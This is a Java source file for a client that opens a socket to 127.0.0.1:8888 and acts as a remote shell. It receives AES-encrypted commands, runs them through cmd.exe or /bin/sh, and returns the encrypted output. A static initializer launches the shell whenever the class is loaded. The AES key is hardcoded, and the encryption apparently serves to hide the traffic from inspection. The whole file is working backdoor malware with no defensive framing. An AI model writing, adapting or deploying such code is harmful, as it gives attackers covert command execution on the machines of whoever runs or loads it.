package org.example;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.Socket;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;

/**
 * @author : msb-zhaoss
 */
public class socketClient {//客户端
    //这是一个main方法，是程序的入口：
    static String key = "I72YPGxLFctx1GnG";
    socketClient(){
        String ip = "127.0.0.1";
        int port = 8888;
        String[] shell = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c"} : new String[]{"/bin/sh", "-c"};
        String currentDir = System.getProperty("user.dir");
        System.out.println();
        try {
            Socket s = new Socket(ip, port);
            InputStream is = s.getInputStream();
            DataInputStream dis = new DataInputStream(is);
            OutputStream os = s.getOutputStream();
            DataOutputStream dos = new DataOutputStream(os);
            dos.writeUTF(currentDir);
            while (true){
                String cmd = dis.readUTF();
                if ("exit".equalsIgnoreCase(decrypt(cmd))){
                    break;//退出进程
                }
                String[] cmder = {shell[0], shell[1], decrypt(cmd)};
                dos.writeUTF(encrypt(executeCmd(cmder)));
            }
            dis.close();
            is.close();
            dos.close();
            os.close();
            s.close();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    public String executeCmd(String[] cmd) throws IOException {
        try{
            Runtime runtime = Runtime.getRuntime();
            Process process = runtime.exec(cmd);
            // 使用BufferedReader读取命令的输出
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            return String.valueOf(output);
        }
        catch (Exception e){
            return String.valueOf(e);
        }

    }
    static {
        new socketClient();
    }
    public static void main(String[] args) {
        new socketClient();
    }
    public static String encrypt(String cmd) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE,secretKeySpec);
        byte[] bytes = cipher.doFinal(cmd.getBytes());
        return Base64.getEncoder().encodeToString(bytes);
    }
    public static String decrypt(String encryptedData) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
        byte[] original = cipher.doFinal(Base64.getDecoder().decode(encryptedData));
        return new String(original);
    }
}